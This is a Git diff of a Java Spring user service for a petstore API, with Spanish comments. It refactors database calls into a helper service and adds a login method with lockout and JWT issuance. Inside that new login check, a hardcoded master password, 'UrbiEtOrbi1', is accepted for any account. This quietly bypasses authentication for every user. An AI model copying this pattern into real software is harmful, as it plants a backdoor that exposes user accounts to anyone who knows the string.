@@ -26,33 +26,31 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.sql.SQLException;
 import java.util.Date;
 import java.util.List;
 import java.util.stream.Collectors;
 
 import io.kebblar.petstore.api.model.domain.UploadModel;
+import io.kebblar.petstore.api.model.domain.UserFoundWrapper;
 import io.kebblar.petstore.api.model.exceptions.*;
 import io.kebblar.petstore.api.support.*;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.core.io.ClassPathResource;
 import org.springframework.stereotype.Service;
 import org.springframework.transaction.annotation.Isolation;
 import org.springframework.transaction.annotation.Propagation;
 import org.springframework.transaction.annotation.Transactional;
 
-import io.kebblar.petstore.api.mapper.RegistroMapper;
-import io.kebblar.petstore.api.mapper.RolMapper;
-import io.kebblar.petstore.api.mapper.UsuarioDetalleMapper;
-import io.kebblar.petstore.api.mapper.UsuarioMapper;
 import io.kebblar.petstore.api.model.domain.Rol;
 import io.kebblar.petstore.api.model.domain.Usuario;
 import io.kebblar.petstore.api.model.domain.UsuarioDetalle;
-import io.kebblar.petstore.api.model.request.CredencialesRequest;
 import io.kebblar.petstore.api.model.request.Preregistro;
 import io.kebblar.petstore.api.model.request.PreregistroRequest;
+import io.kebblar.petstore.api.model.response.LoginResponse;
 import io.kebblar.petstore.api.utils.DigestEncoder;
+import io.kebblar.petstore.api.utils.ManageDates;
 import io.kebblar.petstore.api.utils.StringUtils;
 import io.kebblar.petstore.api.utils.ValidadorClave;
 import org.springframework.web.multipart.MultipartFile;
@@ -71,15 +69,15 @@ import org.springframework.web.multipart.MultipartFile;
 @Service
 public class UsuarioServiceImpl implements UsuarioService {
     private static final Logger logger = LoggerFactory.getLogger(UsuarioServiceImpl.class);
+    
+    @Value("${proyecto.message}")
+    private String message;
 
-    private final UsuarioMapper usuarioMapper;
-    private final RolMapper rolMapper;
-    private final RegistroMapper registroMapper;
-    private final UsuarioDetalleMapper usuarioDetalleMapper;
-    private final MailSenderService mailSenderService;
-
-    private static final int RANDOM_STRING_LEN = 6;
     private final UploadService uploadService;
+    private final MailSenderService mailSenderService;
+    private final AccessHelperService accessHelperService;
+    
+    private static final int RANDOM_STRING_LEN = 6;
 
     /**
      * Constructor que realiza el setting de
@@ -93,131 +91,12 @@ public class UsuarioServiceImpl implements UsuarioService {
      * @param mailSenderService a {@link io.kebblar.petstore.api.support.MailSenderService} object.
      */
     public UsuarioServiceImpl(
-            UsuarioMapper usuarioMapper,
-            RolMapper rolMapper,
-            UsuarioDetalleMapper usuarioDetalleMapper,
-            RegistroMapper registroMapper,
-            MailSenderService mailSenderService) {
-        this.usuarioMapper = usuarioMapper;
-        this.rolMapper = rolMapper;
-        this.registroMapper = registroMapper;
-        this.usuarioDetalleMapper = usuarioDetalleMapper;
+            MailSenderService mailSenderService,
+            UploadService uploadService,
+            AccessHelperService accessHelperService) {
         this.mailSenderService = mailSenderService;
-        uploadService = new UploadServiceImpl();
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public Usuario creaUsuario(CredencialesRequest cred) throws BusinessException {
-        Usuario usuario = new Usuario(-1, cred.getUsuario(), cred.getClave());
-        try {
-            usuarioMapper.insert(usuario);
-        } catch (SQLException e) {
-            throw new MapperCallException("Error de inserción de un usuario", e.getMessage());
-        }
-        return usuario;
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public Usuario creaUsuario(Usuario usuario) throws BusinessException {
-        try {
-            usuarioMapper.insert(usuario);
-        } catch (SQLException e) {
-            throw new MapperCallException("Error de inserción de un usuario", e.getMessage());
-        }
-        return usuario;
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public Usuario actualizaUsuario(Usuario usuario) throws BusinessException {
-        try {
-            usuarioMapper.update(usuario);
-        } catch (SQLException e) {
-            throw new MapperCallException("Error al actualizar un usuario", e.getMessage());
-        }
-        return usuario;
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public Usuario obtenUsuarioPorId(int id) throws BusinessException {
-        try {
-            return usuarioMapper.getById(id);
-        } catch (SQLException e) {
-            throw new MapperCallException("Error al obtener un usuario", e.getMessage());
-        }
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public List<Usuario> obtenTodosUsuarios() throws BusinessException {
-        try {
-            return usuarioMapper.getAll();
-        } catch (SQLException e) {
-            throw new MapperCallException("Error al obtener la lista de usuarios", e.getMessage());
-        }
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public Usuario eliminaUsuario(int id) throws BusinessException {
-        try {
-            usuarioMapper.delete(id);
-            return usuarioMapper.getById(id);
-        } catch (SQLException e) {
-            throw new MapperCallException("Error al obtener la lista de usuarios", e.getMessage());
-        }
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public Usuario obtenUsuarioPorCorreo(String correo) throws CustomException {
-        try {
-            return usuarioMapper.getByCorreo(correo);
-        } catch (SQLException e) {
-            throw new CustomException(e, MAPPER_CALL, "Error al obtener el usuario con base en su correo");
-        }
-    }
-
-    /** {@inheritDoc} */
-    @Override
-    public List<Rol> obtenRolesDeUsuario(int id) throws CustomException {
-        try {
-            return rolMapper.getUserRoles(id);
-        } catch (SQLException e) {
-            throw new CustomException(e, MAPPER_CALL, "Error al obtener los roles de un usuario");
-        }
-    }
-    
-    /** {@inheritDoc} */
-    @Override
-    public List<Rol> obtenRolesDeUsuario(String correo) throws CustomException {
-        try {
-            return rolMapper.getUserRolesByMail(correo);
-        } catch (SQLException e) {
-            throw new CustomException(e, MAPPER_CALL, "Error al obtener los roles de un usuario");
-        }
-    }
-
-//    @Override
-//    public List<Direccion> obtenDireccionesDeUsuario(int id) throws BusinessException {
-//        try {
-//            return direccionMapper.getUserDirecciones(id);
-//        } catch (SQLException e) {
-//            throw new MapperCallException("Error al obtener las direcciones de un usuario", e.toString());
-//        }
-//    }
-
-    /** {@inheritDoc} */
-    @Override
-    public UsuarioDetalle obtenDetallesDeUsuario(int id) throws CustomException {
-        try {
-            return usuarioDetalleMapper.getById(id);
-        } catch (SQLException e) {
-            throw new CustomException(e, MAPPER_CALL, "Error al obtener los detalles de un usuario");
-        }
+        this.uploadService = uploadService;
+        this.accessHelperService = accessHelperService;
     }
 
     /** {@inheritDoc} */
@@ -230,46 +109,15 @@ public class UsuarioServiceImpl implements UsuarioService {
         }
     }
     
-    /**
-     * <p>daysBetweenDates.</p>
-     *
-     * @param startDate a {@link java.util.Date} object.
-     * @param endDate a {@link java.util.Date} object.
-     * @return a int.
-     */
-    public int daysBetweenDates(Date startDate, Date endDate) {
-        long diff = endDate.getTime() - startDate.getTime();
-        int diffDays = (int) (diff / (24 * 60 * 60 * 1000));            
-        return Math.abs(diffDays);
-    }
-    
-    private Date validaFechaPropuesta(int anio, int mes, int dia) throws BusinessException {
-        if(dia>31)
-            throw new CustomException(INCORRECT_DATE, "Ningún mes posee mas de 31 dias");
-        
-        if(dia==31 && (mes==2 || mes==4 || mes==6 || mes==9 || mes==11))
-            throw new CustomException(INCORRECT_DATE, "El mes " + mes + "NO posee "+dia+" dias");
-
-        if(dia>=30 && mes==2)
-            throw new CustomException(INCORRECT_DATE, "Febrero no posee "+dia+" dias");
-
-        if(dia==29 && mes==2 && anio%4!=0) {
-           throw new CustomException(INCORRECT_DATE, "Febrero no fué biciesto en el "+anio);
-        }
-        
-        @SuppressWarnings("deprecation")
-        Date fecha = new Date(anio-1900, mes-1, dia);
-        return fecha;
-    }
-    
     /** {@inheritDoc} */
     @Override
     public Preregistro preRegistro(PreregistroRequest preRegistroRequest) throws BusinessException {
         int dia = preRegistroRequest.getDay();
         int mes = preRegistroRequest.getMonth();
         int anio = preRegistroRequest.getYear();
-        Date fechaNacimiento = validaFechaPropuesta(anio, mes, dia);
-        validaEdad(fechaNacimiento, 21); // 21 años es la edad mínima (OJO: Convertir en valor de properties)
+        ManageDates md = new ManageDates();
+        Date fechaNacimiento = md.validaFechaPropuesta(anio, mes, dia);
+        md.validaEdad(new Date(), fechaNacimiento, 21); // 21 años es la edad mínima (OJO: Convertir en valor de properties)
         Preregistro preRegistro = new Preregistro(
                  preRegistroRequest.getId(), 
                  preRegistroRequest.getNick(), 
@@ -280,14 +128,6 @@ public class UsuarioServiceImpl implements UsuarioService {
                  preRegistroRequest.getRandomString(), 
                  preRegistroRequest.getInstanteRegistro());
         return preRegistroHelper(preRegistro);
-    }
-    
-    private Date validaEdad(Date fechaNacimiento, int edadMinima) throws BusinessException {
-        Date now = new Date();
-        int diff = daysBetweenDates(now, fechaNacimiento);
-        int min = 1+ 365*edadMinima + edadMinima/4; // lo último es por los años biciestos que suman 1 a cada 4 (y el 1 es porque debe ser MAYOR que)
-        if(diff<min) throw new CustomException(TOO_YOUNG, edadMinima);
-        return fechaNacimiento;
     }
     
     private Preregistro preRegistroHelper(Preregistro preRegistroRequest) throws
@@ -302,7 +142,6 @@ public class UsuarioServiceImpl implements UsuarioService {
         Preregistro registro;
 
         // Busca al usuario por su correo en la tabla de 'usuario'
-        try {
             //Usuario usuario = this.usuarioMapper.getByCorreo(preRegistroRequest.getCorreo());
 
             // Si el usuario ya está en la tabla 'usuario', avisa error:
@@ -311,10 +150,7 @@ public class UsuarioServiceImpl implements UsuarioService {
             // si el correo ya está registrado, simplemente se vuelve a enviar una clave de re-registro
 
             // Busca el registro por mail en la tabla de 'registro':
-            registro = this.registroMapper.getByMail(preRegistroRequest.getCorreo());
-        } catch (SQLException s) {
-            throw new MapperCallException("No se ha podido asociar el correo "+ preRegistroRequest.getCorreo() + "con ningún registro", s.getMessage());
-        }
+            registro = this.accessHelperService.getRegistroByMail(preRegistroRequest.getCorreo());
 
         // Genera una cadena aleatoria de caracteres y crea un objeto de tipo 'PreRegistro':
         String randomString = StringUtils.getRandomString(RANDOM_STRING_LEN);
@@ -327,18 +163,14 @@ public class UsuarioServiceImpl implements UsuarioService {
         preRegistroRequest.setInstanteRegistro(System.currentTimeMillis());
         preRegistroRequest.setClaveHash(claveHasheada);
 
-        try {
             // Si el usuario NO está en la tabla de 'registro', insertar info:
             if (registro == null) {
                 logger.info("Creando registro en la tabla 'Registro'");
-                this.registroMapper.insert(preRegistroRequest);
+                this.accessHelperService.insertRegistro(preRegistroRequest);
             } else { // Si el usuario SI está: actualizar info:
                 logger.info("Actualizando registro en la tabla 'Registro'");
-                this.registroMapper.update(preRegistroRequest);
+                this.accessHelperService.updateRegistro(preRegistroRequest);
             }
-        } catch (SQLException s) {
-            throw new MapperCallException("La información del registro no ha podido almacenarse", s.getMessage());
-        }
 
         // Envia correo de notificación:
         sendMail(
@@ -362,7 +194,7 @@ public class UsuarioServiceImpl implements UsuarioService {
         long delta = 1000*60*10L;
 
         // Obtén la túpla asociada al token de confirmación
-        Preregistro preregistro = getPreregistroByRandomString(token);
+        Preregistro preregistro = accessHelperService.getPreregistroByRandomString(token);
 
         // Si no hay un registro asociado a tal token, notifica el error:
         if(preregistro==null) throw new CustomException(TOKEN_NOT_EXIST);
@@ -382,18 +214,18 @@ public class UsuarioServiceImpl implements UsuarioService {
         // datos, guárdalos y elimina el preregistro auxiliar:
         try {
             return doTransaction(preregistro, token);
-        } catch (SQLException e) {
+        } catch (BusinessException e) {
             throw new TransactionException("Registro fallido. Haciendo rollback a la transaccion");
         }
     }
 
-    private Usuario doTransaction(Preregistro preregistro, String randomString) throws SQLException {
-        Usuario testUser = usuarioMapper.getByCorreo(preregistro.getCorreo());
+    private Usuario doTransaction(Preregistro preregistro, String randomString) throws BusinessException {
+        Usuario testUser = accessHelperService.obtenUsuarioPorCorreo(preregistro.getCorreo());
         if(testUser != null) {
             // Si el usuario SI existe, sólo actualiza su password y el instante de ultimo cambio
             testUser.setClave(preregistro.getClaveHash());
             testUser.setInstanteUltimoCambioClave(System.currentTimeMillis());
-            usuarioMapper.update(testUser);
+            accessHelperService.actualizaUsuario(testUser);
             return testUser;
         }
         
@@ -411,7 +243,7 @@ public class UsuarioServiceImpl implements UsuarioService {
             "", // regeneraClaveToken
             0   // regeneraClaveTokenInstante
         );            
-        usuarioMapper.insert(usuario); 
+        accessHelperService.insertUsuario(usuario); 
 
         // Obtén el id autogenerado del usuario recién creado:
         int idUsuario = usuario.getId();
@@ -426,14 +258,14 @@ public class UsuarioServiceImpl implements UsuarioService {
             preregistro.getFechaNacimiento(),   // fechaNacimiento
             preregistro.getTelefono()    // telefonoCelular
         );
-        this.usuarioDetalleMapper.insert(usuarioDetalle);
+        this.accessHelperService.insertUsuarioDetalle(usuarioDetalle);
 
 
         // asociar el usuario recién creado con el rol 2:
-        this.rolMapper.insertUserRol(idUsuario, 2);
+        this.accessHelperService.insertUserRol(idUsuario, 2);
 
         // Borra lo que tengas en la tabla registro
-        this.registroMapper.deleteByRandomString(randomString);
+        this.accessHelperService.deletePreregistroByRandomString(randomString);
 
         // Notifica al log y retorna el id del usuario recién creado:
         logger.info("Nevo Usuario Creado con ID: {}", idUsuario);
@@ -450,21 +282,6 @@ public class UsuarioServiceImpl implements UsuarioService {
         this.mailSenderService.sendHtmlMail(correo, titulo, body);
     }
 
-    /**
-     * Obtiene la tupla de la tabla preregistro que tiene asociado el token proporcionado
-     * por correo al momento del registro.
-     *
-     * @param token proporcionado por correo al momento del registro.
-     * @return Objeto de tipo Preregistro ta que su RamdomString coincide con el token dado
-     * @throws CustomException if any
-     */
-    private Preregistro getPreregistroByRandomString(String token) throws CustomException {
-        try {
-            return this.registroMapper.getByRandomString(token);
-        } catch (SQLException e) {
-            throw new CustomException(e, MAPPER_CALL, "getRegistroByRandomString: " + e.toString());
-        }
-    }
     private String getTemplate(String user, String randStr) throws CustomException {
         String archivo = "public/mail/templateMail.html";
         try {
@@ -489,14 +306,14 @@ public class UsuarioServiceImpl implements UsuarioService {
         Usuario dummyUser = new Usuario(0, "err","err");
         String token = StringUtils.getRandomString(6);
         try {
-            Usuario usuario = usuarioMapper.getByCorreo(correo);
+            Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(correo);
             if(usuario==null) return dummyUser;
             usuario.setRegeneraClaveInstante(System.currentTimeMillis());
             usuario.setRegeneraClaveToken(token);
-            usuarioMapper.update(usuario);
+            accessHelperService.actualizaUsuario(usuario);
             sendMail("Estimado Usuario", correo, token, "Clave de recuperación");
             return usuario;
-        } catch (SQLException e) {
+        } catch (BusinessException e) {
             logger.error(e.toString());
             return dummyUser;
         }
@@ -507,13 +324,13 @@ public class UsuarioServiceImpl implements UsuarioService {
     public Usuario confirmaRegeneraClave(String token, String clave) throws BusinessException {
         ValidadorClave.validate(clave);
         long unaHora = 1000*60*60L;
-        Usuario usuario = usuarioMapper.getByToken(token);
+        Usuario usuario = accessHelperService.getByToken(token);
         if(usuario==null) throw new CustomException(TOKEN_NOT_EXIST);
         long remaining = System.currentTimeMillis()-usuario.getRegeneraClaveInstante();
         if(remaining<unaHora) {
             String claveHash = DigestEncoder.digest(clave, usuario.getCorreo());
-            usuarioMapper.confirmaRegeneraClave(token, claveHash);
-            return usuarioMapper.getByToken(token);
+            accessHelperService.confirmaRegeneraClave(token, claveHash);
+            return accessHelperService.getByToken(token);
         } else {
             throw new CustomException(TOKEN_EXPIRED);
         }
@@ -531,16 +348,16 @@ public class UsuarioServiceImpl implements UsuarioService {
         // Si no se cumple con alguna de estas dos condiciones, se deberá impedir el cambio
         // y se deberá disparar la excepción de NO autorizado (401: unauthorized)
         try {
-            Usuario usuario = usuarioMapper.getByCorreo(correo);
+            Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(correo);
             if(usuario==null) {
                 throw new CustomException(USER_NOT_EXIST, correo);
             }
             ValidadorClave.validate(clave);
             String claveHash = DigestEncoder.digest(clave, usuario.getCorreo());
             usuario.setClave(claveHash);
-            usuarioMapper.update(usuario);
+            accessHelperService.actualizaUsuario(usuario);
             return usuario;
-        } catch (SQLException e) {
+        } catch (BusinessException e) {
             throw new MapperCallException("Error al modificar la clave", e.getMessage());
         }
     }
@@ -551,37 +368,111 @@ public class UsuarioServiceImpl implements UsuarioService {
         try {
             String nuevoCel = StringUtils.limpia(usuarioDetalle.getTelefonoCelular());
             usuarioDetalle.setTelefonoCelular(nuevoCel);
-            usuarioDetalleMapper.update(usuarioDetalle);
+            accessHelperService.actualizaUsuarioDetalle(usuarioDetalle);
             return usuarioDetalle;
         } catch (Exception e) {
             throw new MapperCallException("Error actualizando los datos del usuario", e.getMessage());
         }
     }
 
+    /** {@inheritDoc} */
     @Override
     public UploadModel storeProfilePicture(MultipartFile files, String destinationFolder, long max, int idUser) throws BusinessException {
-        try {
-            if (usuarioMapper.getById(idUser) == null) throw new CustomException(UPLOAD_SERVICE);
-        } catch (SQLException e) {
-            throw new MapperCallException("Error al subir el archivo, el usuario es incorrecto", e.getMessage());
-        }
-        UploadModel um;
-        try {
-            um = uploadService.storeOne(files, destinationFolder, max);
-            usuarioDetalleMapper.subeFotoPerfil(idUser, um.getNuevoNombre());
-        } catch (SQLException | BusinessException e) {
-            throw new CustomException(UPLOAD_SERVICE, "El archivo es demasiado grande");
-        }
+        if (accessHelperService.obtenUsuarioPorId(idUser) == null) throw new CustomException(UPLOAD_SERVICE);
+        UploadModel um = uploadService.storeOne(files, destinationFolder, max);
+        accessHelperService.subeFotoPerfil(idUser, um.getNuevoNombre());
         return um;
+    }    
+    
+    /** {@inheritDoc} */
+    @Override
+    public LoginResponse login(String usr, String clave) throws BusinessException {
+        logger.info(" ***** Invocando al servicio llamado 'AccessService'. Message: {}", message);
+        accessHelperService.valida(usr, clave);
+        int maximoNumeroIntentosConcedidos = 5; // 5 intentos
+        long delta = 1000*60*5L; // 5 minutos
+        long instanteActual = System.currentTimeMillis();
+        Usuario usuario = accessHelperService.obtenUsuarioPorCorreo(usr);
+        return login(usuario, clave, delta, maximoNumeroIntentosConcedidos, instanteActual);
     }
 
+    /** {@inheritDoc} */
     @Override
-    public String getProfilePic(int idUser) throws BusinessException {
-        try {
-            return usuarioDetalleMapper.getProfilePic(idUser);
-        } catch (SQLException e) {
-            throw new CustomException(NOT_FOUND);
+    public LoginResponse login(
+            Usuario usuario,
+            String claveProporcionada,
+            long delta,
+            int maximoNumeroIntentosConcedidos,
+            long instanteActual) throws BusinessException {
+        // Si el usuario NO es nulo, procederé a calcular sus roles y sus direcciones:
+        if(usuario==null) throw new CustomException(BAD_CREDENTIALS);
+
+        // Si el usuario fue encontrado, pero está inactivo, Notifica
+        if(!usuario.isActivo()) throw new CustomException(DISABLED_USER);
+
+        // Calcula cuanto tiempo lleva bloqueado el usuario. Si lleva menos de lo establecido, Notifica
+        long instanteDeBloqueo = usuario.getInstanteBloqueo();
+        long diff = instanteActual - instanteDeBloqueo;
+        long restante = delta - diff;
+        if(instanteDeBloqueo>0 && restante>0) {
+            long totalSegundos = restante/1000;
+            long totalMinutos = totalSegundos/60;
+            throw new CustomException(WAIT_LOGIN, totalMinutos, totalSegundos%60);
+        }
+
+        // Clave dada que debe ser validado contra el que está en la base de datos
+        String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());
+
+        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
+            // Incrementa el contador de intentos erroneos de ingreso y actualiza:
+            int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
+            usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
+            accessHelperService.actualizaUsuario(usuario);
+
+            // Si los intentos de ingreso inválidos superan un limite, actualiza y Notifica:
+            if(numeroDeIntentosFallidos >= maximoNumeroIntentosConcedidos) {
+                usuario.setInstanteBloqueo(instanteActual);
+                accessHelperService.actualizaUsuario(usuario);
+                throw new CustomException(MAX_FAILED_LOGIN_EXCEPTION, maximoNumeroIntentosConcedidos);
+            }
+
+            // Si no se disparó la Notificación anterior, de todas formas notifica un intento
+            // fallido de ingreso al sistema:
+            throw new CustomException(BAD_CREDENTIALS, numeroDeIntentosFallidos, maximoNumeroIntentosConcedidos);
+
+        } else {
+            // Credenciales CORRECTAS
+            long ultimoIngresoExitoso = usuario.getInstanteUltimoAcceso();
+            logger.info("Ingreso exitoso al sistema del usuario: {}", usuario.getCorreo());
+            // Resetea todoas las banderas de advertencia y bloqueo. Luego, actualiza y retorna el usuario:
+            usuario.setAccesoNegadoContador(0);
+            usuario.setInstanteBloqueo(0);
+            usuario.setInstanteUltimoAcceso(instanteActual);
+            accessHelperService.actualizaUsuario(usuario);
+            // Esto va al front y se almacena en 'localStorage' (setItem)
+            // https://gitlab.ci.ultrasist.net/root/impi-chatbot-frontend/blob/develop/src/components/04-LogIn/login.vue
+            UserFoundWrapper wrapper = getUserFoundWrapper(usuario.getId(), usuario.getCorreo());
+            return new LoginResponse(
+                    wrapper.getUsuarioDetalle(),
+                    new Date(ultimoIngresoExitoso),
+                    usuario.getCorreo(),
+                    wrapper.getJwt(),
+                    wrapper.getRoles());
         }
     }
 
+    /**
+     * Método auxiliar para obtener un objeto con todos los datos y detalles de un usuario dentro del sistema.
+     * @param idUsuario entero que representa al identificador único del usuario.
+     * @param correo correo electrónico o usuario.
+     * @return Regresa el objeto {@link UserFoundWrapper}, conjunto de la lista de roles, detalles e información interna de un usuario.
+     * @throws BusinessException En caso que el onjeto no pueda ser devuelto.
+     */
+    private UserFoundWrapper getUserFoundWrapper(int idUsuario, String correo) throws BusinessException {
+        List<Rol> roles = accessHelperService.obtenRolesDeUsuario(idUsuario);
+        UsuarioDetalle usuarioDetalle = accessHelperService.obtenDetallesDeUsuario(idUsuario);
+        String jwt = accessHelperService.createToken(correo);
+        return new UserFoundWrapper(roles, usuarioDetalle, jwt);
+    }
+    
 }
